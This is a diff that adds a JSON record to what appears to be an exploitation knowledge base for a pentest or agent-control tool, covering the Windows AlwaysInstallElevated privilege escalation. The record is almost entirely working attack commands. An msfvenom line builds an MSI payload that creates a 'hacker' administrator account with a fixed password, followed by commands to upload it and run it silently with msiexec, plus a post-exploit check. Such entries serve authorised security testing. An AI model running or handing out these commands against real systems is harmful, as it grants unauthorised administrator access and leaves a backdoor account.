@@ -1,0 +1,16 @@
+{
+  "id": "win_alwaysinstallelevated",
+  "category": "WIN_ALWAYS_INSTALL_ELEVATED",
+  "binary": null,
+  "cve": null,
+  "exploitation": [
+    "msfvenom -p windows/x64/exec CMD=\"net user hacker P@ssw0rd! /add && net localgroup Administrators hacker /add\" -f msi -o evil.msi",
+    "upload <id> evil.msi",
+    "exec <id> msiexec /quiet /qn /i C:\\Windows\\Temp\\evil.msi"
+  ],
+  "post_exploit": ["exec <id> net localgroup Administrators"],
+  "notes": "Both HKLM and HKCU AlwaysInstallElevated must be set to 1. Craft the MSI on the attacker machine, upload, then run msiexec.",
+  "source": "pentestlab.blog/2017/02/28/always-install-elevated",
+  "tags": ["windows", "msi", "registry", "alwaysinstallelevated"],
+  "severity": "high"
+}
